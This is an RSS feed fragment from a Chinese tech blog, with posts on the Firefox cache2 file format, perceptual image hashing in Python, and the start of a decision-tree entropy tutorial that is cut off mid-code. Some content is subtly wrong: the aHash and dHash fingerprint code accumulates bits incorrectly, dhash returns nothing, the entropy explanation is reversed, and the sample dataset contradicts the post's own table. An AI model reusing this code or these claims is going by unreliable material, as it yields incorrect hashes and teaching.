&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;n_chunk的计算方法是“(被缓存文件尺寸+256k-1)/256k”。&lt;/p&gt;
&lt;p&gt;从上面的结构看，解析缓存文件第一步就是从最后4个字节找到缓存文件尺寸，从而找到对应的元信息。元信息中包含了最重要的缓存文件的key ID信息，key ID包含了缓存数据的URL。&lt;/p&gt;
&lt;p&gt;元信息格式：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;内部偏移&lt;/th&gt;
&lt;th&gt;尺寸&lt;/th&gt;
&lt;th&gt;内容&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;0x0&lt;/td&gt;
&lt;td&gt;4 Bytes&lt;/td&gt;
&lt;td&gt;版本信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x4&lt;/td&gt;
&lt;td&gt;4 Bytes&lt;/td&gt;
&lt;td&gt;被获取数量&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x8&lt;/td&gt;
&lt;td&gt;4 Bytes&lt;/td&gt;
&lt;td&gt;上次获取时间戳&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0xC&lt;/td&gt;
&lt;td&gt;4 Bytes&lt;/td&gt;
&lt;td&gt;上次修改时间戳&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x10&lt;/td&gt;
&lt;td&gt;4 Bytes&lt;/td&gt;
&lt;td&gt;超时时间戳&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x14&lt;/td&gt;
&lt;td&gt;4 Bytes&lt;/td&gt;
&lt;td&gt;key的字节长度&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x18&lt;/td&gt;
&lt;td&gt;4 Bytes&lt;/td&gt;
&lt;td&gt;标志位信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x1C&lt;/td&gt;
&lt;td&gt;0x14中的key尺寸&lt;/td&gt;
&lt;td&gt;key信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&amp;hellip;&lt;/td&gt;
&lt;td&gt;&amp;hellip;&lt;/td&gt;
&lt;td&gt;&amp;hellip;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&amp;hellip;&lt;/td&gt;
&lt;td&gt;&amp;hellip;&lt;/td&gt;
&lt;td&gt;请求信息&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;解析代码&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e8%a7%a3%e6%9e%90%e4%bb%a3%e7%a0%81&#34;&gt;
        ##
    &lt;/a&gt;
    解析代码
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;做了个简单的cache2缓存文件解析程序：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/singleye/FirefoxCache2&#34;&gt;https://github.com/singleye/FirefoxCache2&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>哈希计算图片相似性</title>
      <link>/2019/06/%E5%93%88%E5%B8%8C%E8%AE%A1%E7%AE%97%E5%9B%BE%E7%89%87%E7%9B%B8%E4%BC%BC%E6%80%A7/</link>
      <pubDate>Mon, 03 Jun 2019 15:19:04 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2019/06/%E5%93%88%E5%B8%8C%E8%AE%A1%E7%AE%97%E5%9B%BE%E7%89%87%E7%9B%B8%E4%BC%BC%E6%80%A7/</guid>
      <description>&lt;!--toc--&gt;
&lt;h1 id=&#34;ahash平均哈希&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#ahash%e5%b9%b3%e5%9d%87%e5%93%88%e5%b8%8c&#34;&gt;
        ##
    &lt;/a&gt;
    aHash（平均哈希）
&lt;/div&gt;
&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;将图片缩小到8x8的尺寸&lt;/li&gt;
&lt;li&gt;将缩小后的图片转换成灰度图&lt;/li&gt;
&lt;li&gt;计算8x8图片所有像素灰度值的平均值&lt;/li&gt;
&lt;li&gt;创建一个新的8x8矩阵，矩阵的每个值取值为0或1，计算方法是将原矩阵中对应像素的的灰度值与平均值进行对比，当大于等于平均值时记1，小于平均值时记0&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;def ahash(filepath):
    img = cv2.imread(filepath)
    small = cv2.resize(img, (8, 8), interpolation=cv2.INTER_AREA)
    gray = cv2.cvtColor(small, cv2.COLOR_BGR2GRAY)
    fp = 0
    mean = gray.mean()
    w, h = gray.shape
    for x in range(w):
        for y in range(h):
            if gray[x][y] &amp;gt;= mean:
                fp += ((fp &amp;lt;&amp;lt; 1) + 1)
            else:
                fp += ((fp &amp;lt;&amp;lt; 1) + 0)
    return fp
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;dhash差值哈希&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#dhash%e5%b7%ae%e5%80%bc%e5%93%88%e5%b8%8c&#34;&gt;
        ##
    &lt;/a&gt;
    dHash（差值哈希）
&lt;/div&gt;
&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;def dhash(filepath):
    img = cv2.imread(filepath)
    small = cv2.resize(img, (9, 8), interpolation=cv2.INTER_AREA)
    gray = cv2.cvtColor(small, cv2.COLOR_BGR2GRAY)
    fp = 0
    mean = gray.mean()
    w, h = gray.shape
    for x in range(w-1):
        for y in range(h):
            # if the pixel on the left is brighter mark it as 1
            if gray[x][y] &amp;gt; gray[x+1][y]:
                fp += ((fp &amp;lt;&amp;lt; 1) + 1)
            else:
                fp += ((fp &amp;lt;&amp;lt; 1) + 0)
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;phash感知哈希&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#phash%e6%84%9f%e7%9f%a5%e5%93%88%e5%b8%8c&#34;&gt;
        ##
    &lt;/a&gt;
    pHash（感知哈希）
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;pHash算法主要是使用了离散余弦变换（DCT）进行转换。&lt;/p&gt;
&lt;p&gt;利用感知哈希算法计算图片相似度
计算步骤：&lt;/p&gt;
&lt;p&gt;缩放图片：一般大小为32*32，这样方便DCT计算&lt;/p&gt;
&lt;p&gt;简化色彩，转化为灰度图：可以使用Image的convert(&amp;lsquo;L&amp;rsquo;)方法&lt;/p&gt;
&lt;p&gt;计算DCT（离散余弦变换）:&lt;/p&gt;
&lt;p&gt;获得图像的二维数据矩阵f(x,y)&lt;/p&gt;
&lt;p&gt;求离散余弦变换的系数矩阵[A]&lt;/p&gt;
&lt;p&gt;求系数矩阵对应的转置矩阵[A]T&lt;/p&gt;
&lt;p&gt;根据公式[F(u,v)]=[A][f(x,y)][A]T 计算离散余弦变换
缩小DCT：DCT计算后的矩阵是32&lt;em&gt;32，保留左上角的8&lt;/em&gt;8，这些代表的图片的最低频率&lt;/p&gt;
&lt;p&gt;计算平均值：计算缩小DCT后的所有像素点的平均&lt;/p&gt;
&lt;p&gt;进一步减小DCT：大于平均值记录为1，否则为0&lt;/p&gt;
&lt;p&gt;得到64位信息指纹&lt;/p&gt;
&lt;p&gt;记录两张图片的图像指纹的汉明距离，计算图片相似度&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;def phash(filepath, shape=(1, 1)):
    fp = np.zeros(shape, dtype=np.ulonglong)
    try:
        img = cv2.imread(filepath)
        resize = cv2.resize(img, (32, 32))
        gray = cv2.cvtColor(resize, cv2.COLOR_BGR2GRAY)
    except Exception as e:
        print(&amp;#39;-&amp;#39;*80)
        print(&amp;#39;Exception: image [%s]&amp;#39; % filepath)
        print(e)
        print(&amp;#39;-&amp;#39;*80)
        return fp

    left_upper = cv2.dct(gray.astype(float))[:8, :8]
    mean = left_upper.mean()
    h, w = left_upper.shape
    for x in range(w):
        for y in range(h):
            val = int(fp[y//8, x//8])
            if left_upper[y, x] &amp;gt;= mean:
                fp[y//8, x//8] = ((val &amp;lt;&amp;lt; 1) | 1)
            else:
                fp[y//8, x//8] = ((val &amp;lt;&amp;lt; 1) | 0)
    return fp
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;直方图&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%9b%b4%e6%96%b9%e5%9b%be&#34;&gt;
        ##
    &lt;/a&gt;
    直方图
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/nivance/image-similarity&#34;&gt;https://github.com/nivance/image-similarity&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/nivance/image-similarity/blob/master/src/main/java/image/similarity/ImageHistogram.java&#34;&gt;https://github.com/nivance/image-similarity/blob/master/src/main/java/image/similarity/ImageHistogram.java&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;直方图算法是对源图像与要筛选的图像进行直方图数据采集，对采集的各自图像直方图进行归一化再使用巴氏系数算法对直方图数据进行计算，最终得出图像相似度值，其值范围在[0, 1]之间0表示极其不同，1表示极其相似（相同）。&lt;/p&gt;
&lt;p&gt;算法步骤大致可以分为两步，根据源图像与候选图像的像素数据，生成各自直方图数据。第二步：使用第一步输出的直方图结果，运用巴氏系数（Bhattacharyya coefficient）算法，计算出相似程度值。&lt;/p&gt;
&lt;p&gt;第一步：直方图计算 直方图分为灰度直方图与RGB直方图，对于灰度图像直方图计算十分简单，只要初始化一个大小为256的直方图数组H，然后根据像素值完成频率分布统计，假设像素值为124，则H[124] += 1, 而对于彩色RGB像素来说直方图表达有两种方式，一种是单一直方图，另外一种是三维直方图，三维直方图比较简单明了，分别对应RGB三种颜色，定义三个直方图HR,HG, HB, 假设某一个像素点P的RGB值为(4, 231,129), 则对于的直方图计算为HR[4] += 1,HG[231] += 1, HB[129] += 1, 如此对每个像素点完成统计以后，RGB彩色直方图数据就生成了。 而RGB像素的单一直方图SH表示稍微复杂点，每个颜色的值范围为0 ~ 255之间的，假设可以分为一定范围等份，当8等份时，每个等份的值范围为32， 16等份时，每个等份值范围为16，当4等份时候，每个等份值的范围为64，假设RGB值为(14, 68, 221), 16等份之后，它对应直方图索引值(index)分别为: (0, 4, 13), 根据计算索引值公式:index = R + G * 16 + B * 16 * 16 对应的直方图index = 0 + 4 * 16 + 13 * 16 * 16， SH[3392] += 1如此遍历所有RGB像素值，完成直方图数据计算。&lt;/p&gt;
&lt;p&gt;第二步：巴氏系数计算，计算公式如下：$\sum_{i=1}^N\sqrt{p(i)p^{&amp;rsquo;}(i)}$ 。其中p, p&amp;rsquo;分别代表源与候选的图像直方图数据，对每个相同i的数据点乘积开平方以后相加得出的结果即为图像相似度值（巴氏系数因子值），范围为0到1之间。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.cse.yorku.ca/~kosta/CompVis_Notes/bhattacharyya.pdf&#34;&gt;Bhattacharyya Coefficient&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;其他思想&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%85%b6%e4%bb%96%e6%80%9d%e6%83%b3&#34;&gt;
        ##
    &lt;/a&gt;
    其他思想
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;大津法&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%a4%a7%e6%b4%a5%e6%b3%95&#34;&gt;
        #
    &lt;/a&gt;
    大津法
&lt;/div&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.labbookpages.co.uk/software/imgProc/otsuThreshold.html&#34;&gt;Otsu Thresholding&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.ruanyifeng.com/blog/2013/03/similar_image_search_part_ii.html&#34;&gt;阮一峰blog&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;1979年，日本学者大津展之证明了，&amp;ldquo;类内差异最小&amp;quot;与&amp;quot;类间差异最大&amp;quot;是同一件事，即对应同一个阈值。他提出一种简单的算法，可以求出这个阈值，这被称为&amp;quot;大津法&amp;rdquo;（Otsu&amp;rsquo;s method）。下面就是他的计算方法。&lt;/p&gt;
&lt;p&gt;假定一张图片共有n个像素，其中灰度值小于阈值的像素为 n1 个，大于等于阈值的像素为 n2 个（ n1 + n2 = n ）。w1 和 w2 表示这两种像素各自的比重。
　　w1 = n1 / n
　　w2 = n2 / n
再假定，所有灰度值小于阈值的像素的平均值和方差分别为 μ1 和 σ1，所有灰度值大于等于阈值的像素的平均值和方差分别为 μ2 和 σ2。于是，可以得到
　　类内差异 = w1(σ1的平方) + w2(σ2的平方)
　　类间差异 = w1w2(μ1-μ2)^2
可以证明，这两个式子是等价的：得到&amp;quot;类内差异&amp;quot;的最小值，等同于得到&amp;quot;类间差异&amp;quot;的最大值。不过，从计算难度看，后者的计算要容易一些。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>机器学习 - 决策树</title>
      <link>/2019/04/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%86%B3%E7%AD%96%E6%A0%91/</link>
      <pubDate>Mon, 15 Apr 2019 17:04:37 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2019/04/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%86%B3%E7%AD%96%E6%A0%91/</guid>
      <description>&lt;!--toc--&gt;
&lt;h1 id=&#34;机器学习-决策树&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%9c%ba%e5%99%a8%e5%ad%a6%e4%b9%a0-%e5%86%b3%e7%ad%96%e6%a0%91&#34;&gt;
        ##
    &lt;/a&gt;
    机器学习-决策树
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;1什么是问题树&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#1%e4%bb%80%e4%b9%88%e6%98%af%e9%97%ae%e9%a2%98%e6%a0%91&#34;&gt;
        #
    &lt;/a&gt;
    1.什么是问题树？
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;请思考以下场景&lt;/p&gt;
&lt;h3 id=&#34;11玩过猜字游戏吗&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#11%e7%8e%a9%e8%bf%87%e7%8c%9c%e5%ad%97%e6%b8%b8%e6%88%8f%e5%90%97&#34;&gt;
        ##
    &lt;/a&gt;
    1.1.玩过猜字游戏吗？
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2019/04/decision-tree/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;12如何通过几个问题区分猫狗鸡鸭&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#12%e5%a6%82%e4%bd%95%e9%80%9a%e8%bf%87%e5%87%a0%e4%b8%aa%e9%97%ae%e9%a2%98%e5%8c%ba%e5%88%86%e7%8c%ab%e7%8b%97%e9%b8%a1%e9%b8%ad&#34;&gt;
        ##
    &lt;/a&gt;
    1.2.如何通过几个问题区分“猫狗鸡鸭”？
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2019/04/decision-tree/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;121他们的特征是什么&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#121%e4%bb%96%e4%bb%ac%e7%9a%84%e7%89%b9%e5%be%81%e6%98%af%e4%bb%80%e4%b9%88&#34;&gt;
        ###
    &lt;/a&gt;
    1.2.1.他们的特征是什么？
&lt;/div&gt;
&lt;/h4&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;物种&lt;/th&gt;
&lt;th&gt;腿的数量&lt;/th&gt;
&lt;th&gt;有没有脚蹼&lt;/th&gt;
&lt;th&gt;喙的形状&lt;/th&gt;
&lt;th&gt;会不会游泳&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;猫&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;没有&lt;/td&gt;
&lt;td&gt;没有&lt;/td&gt;
&lt;td&gt;不会&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;狗&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;没有&lt;/td&gt;
&lt;td&gt;没有&lt;/td&gt;
&lt;td&gt;会&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;鸡&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;没有&lt;/td&gt;
&lt;td&gt;尖&lt;/td&gt;
&lt;td&gt;不会&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;鸭&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;有&lt;/td&gt;
&lt;td&gt;扁&lt;/td&gt;
&lt;td&gt;会&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;数据的表示方法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;类别：猫、狗、鸡、鸭&lt;/li&gt;
&lt;li&gt;特征：腿的数量、有没有脚蹼、喙的形状，会不会游泳&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;122以下是一种区分方法&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#122%e4%bb%a5%e4%b8%8b%e6%98%af%e4%b8%80%e7%a7%8d%e5%8c%ba%e5%88%86%e6%96%b9%e6%b3%95&#34;&gt;
        ###
    &lt;/a&gt;
    1.2.2.以下是一种区分方法
&lt;/div&gt;
&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2019/04/decision-tree/6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;思考1：以上是不是唯一的方法？&lt;/strong&gt;
&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2019/04/decision-tree/7.png&#34; alt=&#34;7&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;思考2：哪种判定方式更好？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;思考3：如何更有效的区分？&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果某个特征区分问题更有效？&lt;/li&gt;
&lt;li&gt;怎么判断问题更有效？&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2为什么需要决策树&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#2%e4%b8%ba%e4%bb%80%e4%b9%88%e9%9c%80%e8%a6%81%e5%86%b3%e7%ad%96%e6%a0%91&#34;&gt;
        #
    &lt;/a&gt;
    2.为什么需要决策树
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;此刻你可能会想到：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1. 寻找关键性问题！&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 什么是关键性问题？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 怎么寻找关键性问题？&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;21理论依据是什么&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#21%e7%90%86%e8%ae%ba%e4%be%9d%e6%8d%ae%e6%98%af%e4%bb%80%e4%b9%88&#34;&gt;
        ##
    &lt;/a&gt;
    2.1.理论依据是什么？
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;&amp;ldquo;香农&amp;quot;提出信息论，其中对信息的度量成为香农熵，简称“熵(Entropy)”&lt;/p&gt;
&lt;p&gt;在分类问题中，假设存在类别集合为  $ (X_1, X_2, &amp;hellip; X_n) $ ，将类别 $ X_i $ 的信息定义为:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;$ l(X_i) = -log(P(X_i))$ , 其中 $ P(X_i)$为 $X_i $的概率&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;熵：信息的数学期望值： $ H= -\sum_{i=1}^n P(X_i) log(P(X_i))$&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;思考4：怎么理解熵？&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;信息量越大，熵越小&lt;/li&gt;
&lt;li&gt;信息量越小，熵越大&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2019/04/decision-tree/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;思考5：为什么使用对数表示信息？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;概率 vs 信息&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;概率越大，信息量越小&lt;/li&gt;
&lt;li&gt;概率越小，信息量越大&lt;/li&gt;
&lt;li&gt;多个事件同时发生的概率是多个事件发生概率相乘，总信息量是多个事件信息量相加&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;练习1：给定以下数据集，写出熵的计算方法&lt;/strong&gt;&lt;/p&gt;
$$ H= -\sum_{i=1}^n P(X_i) log(P(X_i)) $$
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;from&lt;/span&gt; math &lt;span style=&#34;color:#ff6ac1&#34;&gt;import&lt;/span&gt; log
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#57c7ff&#34;&gt;create_dataset&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    features &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;legs&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;flippers&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;beak&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;swim&amp;#39;&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    dataset &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; [
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        [&lt;span style=&#34;color:#ff9f43&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ff9f43&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;No&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;No&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;cat&amp;#39;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        [&lt;span style=&#34;color:#ff9f43&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ff9f43&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;No&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;No&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;cat&amp;#39;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        [&lt;span style=&#34;color:#ff9f43&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ff9f43&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;No&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;No&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;cat&amp;#39;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        [&lt;span style=&#34;color:#ff9f43&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ff9f43&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;No&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;Yes&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;dog&amp;#39;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        [&lt;span style=&#34;color:#ff9f43&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ff9f43&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;No&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;Yes&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;dog&amp;#39;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        [&lt;span style=&#34;color:#ff9f43&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ff9f43&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;Sharp&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;No&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;chicken&amp;#39;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        [&lt;span style=&#34;color:#ff9f43&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ff9f43&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;Sharp&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;No&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;chicken&amp;#39;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        [&lt;span style=&#34;color:#ff9f43&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ff9f43&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;Flat&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;No&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;duck&amp;#39;&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff6ac1&#34;&gt;return&lt;/span&gt; dataset, features
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#57c7ff&#34;&gt;calc_entropy&lt;/span&gt;(dataset):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    count &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;len&lt;/span&gt;(dataset)
